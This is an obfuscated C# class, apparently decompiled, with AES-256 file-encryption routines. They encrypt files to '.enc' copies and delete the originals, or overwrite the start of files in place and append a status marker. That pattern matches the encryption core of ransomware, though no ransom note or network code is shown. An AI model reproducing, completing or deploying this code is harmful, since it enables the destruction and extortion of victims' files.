using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace VsYjhNTIRPBh;

public static class goQLZKylfBJoMX
{
	public const int umTkwmCepQUA = 256;

	public static byte[] OZQHXNKPCWEeLx(int BoUTrSfABXY)
	{
		byte[] array = new byte[BoUTrSfABXY];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool lSwXBPATFVIp(string kCQrudrcmGviG, byte[] PVfNaPdtqjWO, bool xDaIiYfbXakNx)
	{
		byte[] array = OZQHXNKPCWEeLx(16);
		using FileStream fileStream = new FileStream(kCQrudrcmGviG + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = tZdegeSzJMfI(PVfNaPdtqjWO, array);
		PVfNaPdtqjWO = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(kCQrudrcmGviG, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (xDaIiYfbXakNx)
			{
				File.Delete(kCQrudrcmGviG);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool bLTQSjcraxzTjkLcr(string BdxuXaFbZzYayJ, byte[] JVLHvwytPcMBVy, bool CCGaVoJMxiSZTg)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(BdxuXaFbZzYayJ, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = tZdegeSzJMfI(JVLHvwytPcMBVy, array);
		JVLHvwytPcMBVy = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(BdxuXaFbZzYayJ.Remove(BdxuXaFbZzYayJ.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] CqEeuYLOGtltNm(byte[] WJqUVVdodPiH, byte[] XaDwTWtStCq, byte[] VSJzqlOucqPD)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = tZdegeSzJMfI(XaDwTWtStCq, VSJzqlOucqPD);
		XaDwTWtStCq = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(WJqUVVdodPiH, 0, WJqUVVdodPiH.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] NeZvtUqrZpS(byte[] NmqYOJADTkooAbu, byte[] hTjGjMblZzHmmtr, byte[] ouVfDQtQaTPNCoK)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = tZdegeSzJMfI(hTjGjMblZzHmmtr, ouVfDQtQaTPNCoK);
		hTjGjMblZzHmmtr = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(NmqYOJADTkooAbu, 0, NmqYOJADTkooAbu.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool lPZPdSHlsFsv(byte[] uYBRTAzxCMt, byte[] EVtqZxKCCsuMk, byte[] jbkymtqgLZb)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = tZdegeSzJMfI(uYBRTAzxCMt, EVtqZxKCCsuMk);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(jbkymtqgLZb);
	}

	public static Rfc2898DeriveBytes tZdegeSzJMfI(byte[] LubCtkBpVGZxC, byte[] bHplraZxrYLNqgh)
	{
		return new Rfc2898DeriveBytes(LubCtkBpVGZxC, bHplraZxrYLNqgh, 52768);
	}

	public static byte[] NqSyJmWMHCvpIn(string ltgvPkZfPT, int nzaaJKKqQWw)
	{
		byte[] array = new byte[nzaaJKKqQWw];
		try
		{
			if (BdNzYJbFQkt.spWsYMjzyqV == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ltgvPkZfPT, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, nzaaJKKqQWw);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(ltgvPkZfPT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, nzaaJKKqQWw);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (BdNzYJbFQkt.nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(BdNzYJbFQkt.vsTGVFSJmItByidD, "File: " + ltgvPkZfPT + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(ltgvPkZfPT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, nzaaJKKqQWw);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void TRVBZzkmRKRt(string fprCvFubCIRP, byte[] BadfsIMDWVvNqE, byte[] DgqotAuYtuq = null)
	{
		try
		{
			byte[] array = null;
			if (BdNzYJbFQkt.spWsYMjzyqV == "YES")
			{
				array = (BdNzYJbFQkt.USpxehIBNWBw ? Encoding.ASCII.GetBytes(BdNzYJbFQkt.bRWwIGxQDNUf(BdNzYJbFQkt.BcfodWWANh) + BdNzYJbFQkt.bRWwIGxQDNUf("Kw==") + Convert.ToString(BdNzYJbFQkt.AuoMqBzahHDilI) + BdNzYJbFQkt.bRWwIGxQDNUf("Kw==")) : Encoding.ASCII.GetBytes(BdNzYJbFQkt.bRWwIGxQDNUf(BdNzYJbFQkt.BcfodWWANh) + BdNzYJbFQkt.bRWwIGxQDNUf("LQ==") + Convert.ToString(BdNzYJbFQkt.AuoMqBzahHDilI) + BdNzYJbFQkt.bRWwIGxQDNUf("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(fprCvFubCIRP, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(BadfsIMDWVvNqE, 0, BadfsIMDWVvNqE.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(fprCvFubCIRP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!BdNzYJbFQkt.USpxehIBNWBw)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(DgqotAuYtuq, 0, DgqotAuYtuq.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (BdNzYJbFQkt.USpxehIBNWBw ? Encoding.ASCII.GetBytes(BdNzYJbFQkt.bRWwIGxQDNUf(BdNzYJbFQkt.BcfodWWANh) + BdNzYJbFQkt.bRWwIGxQDNUf("Kw==") + Convert.ToString(BdNzYJbFQkt.AuoMqBzahHDilI) + BdNzYJbFQkt.bRWwIGxQDNUf("Kw==")) : Encoding.ASCII.GetBytes(BdNzYJbFQkt.bRWwIGxQDNUf(BdNzYJbFQkt.BcfodWWANh) + BdNzYJbFQkt.bRWwIGxQDNUf("LQ==") + Convert.ToString(BdNzYJbFQkt.AuoMqBzahHDilI) + BdNzYJbFQkt.bRWwIGxQDNUf("LQ==")));
			FileStream fileStream2 = new FileStream(fprCvFubCIRP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(BadfsIMDWVvNqE, 0, BadfsIMDWVvNqE.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(fprCvFubCIRP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!BdNzYJbFQkt.USpxehIBNWBw)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(DgqotAuYtuq, 0, DgqotAuYtuq.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (BdNzYJbFQkt.nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(BdNzYJbFQkt.vsTGVFSJmItByidD, "File: " + fprCvFubCIRP + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (BdNzYJbFQkt.USpxehIBNWBw ? Encoding.ASCII.GetBytes(BdNzYJbFQkt.bRWwIGxQDNUf(BdNzYJbFQkt.BcfodWWANh) + BdNzYJbFQkt.bRWwIGxQDNUf("Kw==") + Convert.ToString(BdNzYJbFQkt.AuoMqBzahHDilI) + BdNzYJbFQkt.bRWwIGxQDNUf("Kw==")) : Encoding.ASCII.GetBytes(BdNzYJbFQkt.bRWwIGxQDNUf(BdNzYJbFQkt.BcfodWWANh) + BdNzYJbFQkt.bRWwIGxQDNUf("LQ==") + Convert.ToString(BdNzYJbFQkt.AuoMqBzahHDilI) + BdNzYJbFQkt.bRWwIGxQDNUf("LQ==")));
			FileStream fileStream4 = new FileStream(fprCvFubCIRP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(BadfsIMDWVvNqE, 0, BadfsIMDWVvNqE.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(fprCvFubCIRP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!BdNzYJbFQkt.USpxehIBNWBw)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(DgqotAuYtuq, 0, DgqotAuYtuq.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}
}
